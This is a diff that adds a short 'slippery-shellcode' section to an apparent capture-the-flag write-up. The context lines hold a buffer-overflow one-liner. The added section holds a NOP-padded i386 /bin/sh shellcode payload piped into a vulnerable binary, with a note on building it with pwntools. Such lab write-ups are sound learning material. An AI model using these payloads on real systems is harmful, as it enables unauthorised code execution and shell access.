@@ -82,6 +82,16 @@ It took a little bit of playing around to retrieve the flag, but I've provided m
 cat <(echo -e '666666666666666666666666666666666666666666666666666666666666666AAAABBBBCCCCD\xe6\x85\x04\x08') - | ./vuln
 </code>
 
+#### slippery-shellcode
+I'll add more info later but will add super basic methodology along with my code below.
+
+I used python generate 256 bytes of data, then appended my shellcode using the pwn library ```asm(shellcraft.i386.linux.sh())```
+
+After that I used the same method as OverFlow1 to execute my code.
+
+<code>cat <(echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAjhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80') - | ./vuln</code>
+
+
 ## Web Exploitation
 
 #### Insp3ct0r
